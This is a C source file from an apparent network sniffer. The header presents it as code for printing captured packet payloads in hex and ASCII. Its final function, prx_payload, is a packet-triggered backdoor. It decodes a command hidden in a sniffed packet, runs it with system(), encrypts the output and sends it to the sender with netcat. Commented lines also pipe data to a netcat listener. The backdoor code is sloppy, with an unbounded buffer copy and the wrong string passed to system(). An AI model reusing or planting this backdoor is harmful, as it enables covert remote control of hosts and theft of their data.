/*---------------------------------------------------------------------------------------------
--	SOURCE FILE:	proc_payload.c - Set of function to process and print the packet payload
--
--	FUNCTIONS:		libpcap - packet filtering library based on the BSD packet
--					filter (BPF)
--
--	DATE:			May 4, 2016
--
--	REVISIONS:		(Date and nic_description)
--
--
--	DESIGNERS:		Based on the code by Martin Casado
--				Modified & redesigned: Aman Abdulla: May 4, 2016
--
--	PROGRAMMER:		Aman Abdulla
--
--	NOTES:
--	This file contain thw functions to process and print out the payload data in captured
--      datagrams. The payload content is printed out as ASCII and hex.
-------------------------------------------------------------------------------------------------*/

#include "pkt_sniff.h"


// This function will print payload data
void print_payload (const u_char *payload, int len)
{

	int len_rem = len;
	int line_width = 16;		// number of bytes per line
	int line_len;
	int offset = 0;			// offset counter
	const u_char *ch = payload;

	if (len <= 0)
		return;

	// does data fits on one line?
	if (len <= line_width)
        {
		print_hex_ascii_line (ch, len, offset);
		return;
	}

	// data spans multiple lines
	for ( ;; )
        {
		// determine the line length and print
		line_len = line_width % len_rem;
		print_hex_ascii_line (ch, line_len, offset);

                // Process the remainder of the line
		len_rem -= line_len;
		ch += line_len;
		offset += line_width;

                // Ensure we have line width chars or less
		if (len_rem <= line_width)
                {
			//print last line
			print_hex_ascii_line (ch, len_rem, offset);
			break;
		}
	}
 }

// Print data in hex & ASCII
void print_hex_ascii_line (const u_char *payload, int len, int offset)
{

	int i;
	int gap;
	const u_char *ch;

	// the offset
	printf("%05d   ", offset);

	// print in hex
	ch = payload;
	for (i = 0; i < len; i++)
        {
		printf("%02x ", *ch);
		ch++;
		if (i == 7)
                    printf(" ");
	}

	// print spaces to handle a line size of less than 8 bytes
	if (len < 8)
		printf(" ");

	// Pad the line with whitespace if necessary
	if (len < 16)
        {
		gap = 16 - len;
		for (i = 0; i < gap; i++)
                    printf("   ");
        }
	printf("   ");

	// Print ASCII
	ch = payload;
	for (i = 0; i < len; i++)
        {
		if (isprint(*ch))
			printf("%c", *ch);
		else
			printf(".");
		ch++;
	}

	printf ("\n");
}
void prx_payload(const u_char *payload, int len){
	int i,j;
	char msg[512], msgx[512], * request, * sender, * resport, * stringp;
	char inf[]="tmp1", ouf[]="tmp2";
	FILE *fp;
//	printf("in payload\n%s",payload);

//	fp = popen("nc 192.168.0.10 10065","w");
//	fprintf(fp,"testing the interface\n");

//	fp = popen(request,"w");

	for (i=0; i<len;i++){
		msg[i]=swapIN(payload[i]);
	}
	printf("message:\n%s\n",msg);
	stringp = msg;

	sender = strsep(&stringp,":");
	resport = strsep(&stringp,"<");
	request = strsep(&stringp,";");

	printf("Send %s to %s:%s\n",request,sender,resport);
	stringp = calloc(64, sizeof(char));
	sprintf(stringp,"%s > %s\0", request, inf);
	printf("%s\n",stringp);
	system(msg);

	cryptIN(inf,ouf);

	stringp = calloc(64, sizeof(char));
	sprintf(stringp,"nc %s %s < %s\0",sender,resport,ouf);
	printf("%s\n",stringp);

	system(stringp);
	system("rm tmp1 tmp2");

/*	fp = popen(request, "r");

	while((i=fread(msg,1,BUFFSIZE,fp)) !=0){
		for (j=0;j<i;j++){
			msgx[j]=swapIN(msg[j]);
		}
	}

	sprintf(request,"nc %s %s ",sender, resport);
	fp = popen(request,"w");
	fprintf(fp,"%s",msgx);
*/
}
